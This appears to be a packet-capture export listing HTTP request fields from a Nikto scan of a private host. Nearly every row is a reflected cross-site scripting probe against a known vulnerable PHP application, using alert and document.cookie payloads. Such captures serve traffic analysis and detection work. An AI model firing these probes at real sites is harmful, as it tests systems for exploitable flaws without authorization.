http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																	Keep-Alive										192.168.1.101									2588						1	http://192.168.1.101/web/wp-login.php/phpwebchat/register.php?register=yes&username=OverG&email=<script>alert%20(\"Vulnerable\")</script>&email1=<script>alert%20(\"Vulnerable\")</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000813)				/web/wp-login.php/phpwebchat/register.php?register=yes&username=OverG&email=<script>alert%20(\"Vulnerable\")</script>&email1=<script>alert%20(\"Vulnerable\")</script>
																	Keep-Alive										192.168.1.101									2592						1	http://192.168.1.101/web/wp-login.php/phptonuke.php?filnavn=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000814)				/web/wp-login.php/phptonuke.php?filnavn=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2596						1	http://192.168.1.101/web/wp-login.php/phprank/add.php?page=add&spass=1&name=2&siteurl=3&email=%3Cscript%3Ealert(Vulnerable)%3C/script%3E		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000815)				/web/wp-login.php/phprank/add.php?page=add&spass=1&name=2&siteurl=3&email=%3Cscript%3Ealert(Vulnerable)%3C/script%3E
																	Keep-Alive										192.168.1.101									2600						1	http://192.168.1.101/web/wp-login.php/phpinfo.php?VARIABLE=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000816)				/web/wp-login.php/phpinfo.php?VARIABLE=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2604						1	http://192.168.1.101/web/wp-login.php/phpinfo.php3?VARIABLE=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000817)				/web/wp-login.php/phpinfo.php3?VARIABLE=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2608						1	http://192.168.1.101/web/wp-login.php/phpimageview.php?pic=javascript:alert(8754)		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000818)				/web/wp-login.php/phpimageview.php?pic=javascript:alert(8754)
																	Keep-Alive										192.168.1.101									2612						1	http://192.168.1.101/web/wp-login.php/phpclassifieds/latestwap.php?url=<script>alert('Vulnerable');</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000819)				/web/wp-login.php/phpclassifieds/latestwap.php?url=<script>alert('Vulnerable');</script>
																	Keep-Alive										192.168.1.101									2616						1	http://192.168.1.101/web/wp-login.php/phpBB/viewtopic.php?topic_id=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000820)				/web/wp-login.php/phpBB/viewtopic.php?topic_id=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2620						1	http://192.168.1.101/web/wp-login.php/phpBB/viewtopic.php?t=17071&highlight=\">\"<script>javascript:alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000821)				/web/wp-login.php/phpBB/viewtopic.php?t=17071&highlight=\">\"<script>javascript:alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									2624						1	http://192.168.1.101/web/wp-login.php/phorum/admin/header.php?GLOBALS[message]=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000822)				/web/wp-login.php/phorum/admin/header.php?GLOBALS[message]=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2628						1	http://192.168.1.101/web/wp-login.php/phorum/admin/footer.php?GLOBALS[message]=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000823)				/web/wp-login.php/phorum/admin/footer.php?GLOBALS[message]=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2632						1	http://192.168.1.101/web/wp-login.php/pages/htmlos/%3Cscript%3Ealert('Vulnerable');%3C/script%3E		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000825)				/web/wp-login.php/pages/htmlos/%3Cscript%3Ealert('Vulnerable');%3C/script%3E
																	Keep-Alive										192.168.1.101									2636						1	http://192.168.1.101/web/wp-login.php/Page/1,10966,,00.html?var=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000826)				/web/wp-login.php/Page/1,10966,,00.html?var=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2640						1	http://192.168.1.101/web/wp-login.php/openautoclassifieds/friendmail.php?listing=<script>alert(document.domain);</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000827)				/web/wp-login.php/openautoclassifieds/friendmail.php?listing=<script>alert(document.domain);</script>
																	Keep-Alive										192.168.1.101									2644						1	http://192.168.1.101/web/wp-login.php/openautoclassifieds/friendmail.php?listing=&lt;script&gt;alert(document.domain);&lt;/script&gt;		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000828)				/web/wp-login.php/openautoclassifieds/friendmail.php?listing=&lt;script&gt;alert(document.domain);&lt;/script&gt;
																	Keep-Alive										192.168.1.101									2648						1	http://192.168.1.101/web/wp-login.php/node/view/666\"><script>alert(document.domain)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000829)				/web/wp-login.php/node/view/666\"><script>alert(document.domain)</script>
																	Keep-Alive										192.168.1.101									2652						1	http://192.168.1.101/web/wp-login.php/netutils/whodata.stm?sitename=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000830)				/web/wp-login.php/netutils/whodata.stm?sitename=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									2656						1	http://192.168.1.101/web/wp-login.php/nav/cList.php?root=</script><script>alert('Vulnerable')/<script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000831)				/web/wp-login.php/nav/cList.php?root=</script><script>alert('Vulnerable')/<script>
																	Keep-Alive										192.168.1.101									2660						1	http://192.168.1.101/web/wp-login.php/myphpnuke/links.php?op=search&query=[script]alert('Vulnerable);[/script]?query=		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000832)				/web/wp-login.php/myphpnuke/links.php?op=search&query=[script]alert('Vulnerable);[/script]?query=
																	Keep-Alive										192.168.1.101									2664						1	http://192.168.1.101/web/wp-login.php/myphpnuke/links.php?op=search&query=[script]alert('Vulnerable);[/script]?query=		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000833)				/web/wp-login.php/myphpnuke/links.php?op=search&query=[script]alert('Vulnerable);[/script]?query=
																	Keep-Alive										192.168.1.101									2668						1	http://192.168.1.101/web/wp-login.php/myphpnuke/links.php?op=MostPopular&ratenum=[script]alert(document.cookie);[/script]&ratetype=percent		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000834)				/web/wp-login.php/myphpnuke/links.php?op=MostPopular&ratenum=[script]alert(document.cookie);[/script]&ratetype=percent
																	Keep-Alive										192.168.1.101									2672						1	http://192.168.1.101/web/wp-login.php/myphpnuke/links.php?op=MostPopular&ratenum=[script]alert(document.cookie);[/script]&ratetype=percent		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000835)				/web/wp-login.php/myphpnuke/links.php?op=MostPopular&ratenum=[script]alert(document.cookie);[/script]&ratetype=percent
																	Keep-Alive										192.168.1.101									2676						1	http://192.168.1.101/web/wp-login.php/myhome.php?action=messages&box=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000836)				/web/wp-login.php/myhome.php?action=messages&box=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2680						1	http://192.168.1.101/web/wp-login.php/msadm/user/login.php3?account_name=\"><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000837)				/web/wp-login.php/msadm/user/login.php3?account_name=\"><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2684						1	http://192.168.1.101/web/wp-login.php/msadm/site/index.php3?authid=\"><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000838)				/web/wp-login.php/msadm/site/index.php3?authid=\"><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2688						1	http://192.168.1.101/web/wp-login.php/msadm/domain/index.php3?account_name=\"><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000839)				/web/wp-login.php/msadm/domain/index.php3?account_name=\"><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2692						1	http://192.168.1.101/web/wp-login.php/modules/Submit/index.php?op=pre&title=<script>alert(document.cookie);</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000840)				/web/wp-login.php/modules/Submit/index.php?op=pre&title=<script>alert(document.cookie);</script>
																	Keep-Alive										192.168.1.101									2696						1	http://192.168.1.101/web/wp-login.php/modules/Forums/bb_smilies.php?site_font=}--></style><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000841)				/web/wp-login.php/modules/Forums/bb_smilies.php?site_font=}--></style><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2700						1	http://192.168.1.101/web/wp-login.php/modules/Forums/bb_smilies.php?name=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000842)				/web/wp-login.php/modules/Forums/bb_smilies.php?name=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2704						1	http://192.168.1.101/web/wp-login.php/modules/Forums/bb_smilies.php?Default_Theme=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000843)				/web/wp-login.php/modules/Forums/bb_smilies.php?Default_Theme=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2708						1	http://192.168.1.101/web/wp-login.php/modules/Forums/bb_smilies.php?bgcolor1=\"><script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000844)				/web/wp-login.php/modules/Forums/bb_smilies.php?bgcolor1=\"><script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2712						1	http://192.168.1.101/web/wp-login.php/modules.php?op=modload&name=Xforum&file=member&action=viewpro&member=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000845)				/web/wp-login.php/modules.php?op=modload&name=Xforum&file=member&action=viewpro&member=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2716						1	http://192.168.1.101/web/wp-login.php/modules.php?op=modload&name=Xforum&file=<script>alert('Vulnerable')</script>&fid=2		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000846)				/web/wp-login.php/modules.php?op=modload&name=Xforum&file=<script>alert('Vulnerable')</script>&fid=2
																	Keep-Alive										192.168.1.101									2720						1	http://192.168.1.101/web/wp-login.php/modules.php?op=modload&name=Wiki&file=index&pagename=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000847)				/web/wp-login.php/modules.php?op=modload&name=Wiki&file=index&pagename=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2724						1	http://192.168.1.101/web/wp-login.php/modules.php?op=modload&name=Web_Links&file=index&l_op=viewlink&cid=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000848)				/web/wp-login.php/modules.php?op=modload&name=Web_Links&file=index&l_op=viewlink&cid=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2728						1	http://192.168.1.101/web/wp-login.php/modules.php?op=modload&name=WebChat&file=index&roomid=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000849)				/web/wp-login.php/modules.php?op=modload&name=WebChat&file=index&roomid=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2732						1	http://192.168.1.101/web/wp-login.php/modules.php?op=modload&name=Members_List&file=index&letter=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000850)				/web/wp-login.php/modules.php?op=modload&name=Members_List&file=index&letter=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2736						1	http://192.168.1.101/web/wp-login.php/modules.php?op=modload&name=Guestbook&file=index&entry=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000851)				/web/wp-login.php/modules.php?op=modload&name=Guestbook&file=index&entry=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2740						1	http://192.168.1.101/web/wp-login.php/modules.php?op=modload&name=FAQ&file=index&myfaq=yes&id_cat=1&categories=%3Cimg%20src=javascript:alert(9456);%3E&parent_id=0		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000852)				/web/wp-login.php/modules.php?op=modload&name=FAQ&file=index&myfaq=yes&id_cat=1&categories=%3Cimg%20src=javascript:alert(9456);%3E&parent_id=0
																	Keep-Alive										192.168.1.101									2744						1	http://192.168.1.101/web/wp-login.php/modules.php?op=modload&name=DMOZGateway&file=index&topic=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000853)				/web/wp-login.php/modules.php?op=modload&name=DMOZGateway&file=index&topic=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2748						1	http://192.168.1.101/web/wp-login.php/modules.php?op=modload&name=books&file=index&req=search&query=|script|alert(document.cookie)|/script|		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000854)				/web/wp-login.php/modules.php?op=modload&name=books&file=index&req=search&query=|script|alert(document.cookie)|/script|
																	Keep-Alive										192.168.1.101									2752						1	http://192.168.1.101/web/wp-login.php/modules.php?name=Your_Account&op=userinfo&username=bla<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000855)				/web/wp-login.php/modules.php?name=Your_Account&op=userinfo&username=bla<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									2756						1	http://192.168.1.101/web/wp-login.php/modules.php?name=Your_Account&op=userinfo&uname=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000856)				/web/wp-login.php/modules.php?name=Your_Account&op=userinfo&uname=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2760						1	http://192.168.1.101/web/wp-login.php/modules.php?name=Surveys&pollID=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000857)				/web/wp-login.php/modules.php?name=Surveys&pollID=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									2764						1	http://192.168.1.101/web/wp-login.php/modules.php?name=Stories_Archive&sa=show_month&year=<script>alert('Vulnerable')</script>&month=3&month_l=test		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000858)				/web/wp-login.php/modules.php?name=Stories_Archive&sa=show_month&year=<script>alert('Vulnerable')</script>&month=3&month_l=test
																	Keep-Alive										192.168.1.101									2768						1	http://192.168.1.101/web/wp-login.php/modules.php?name=Stories_Archive&sa=show_month&year=2002&month=03&month_l=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000859)				/web/wp-login.php/modules.php?name=Stories_Archive&sa=show_month&year=2002&month=03&month_l=<script>alert('Vulnerable')</script>
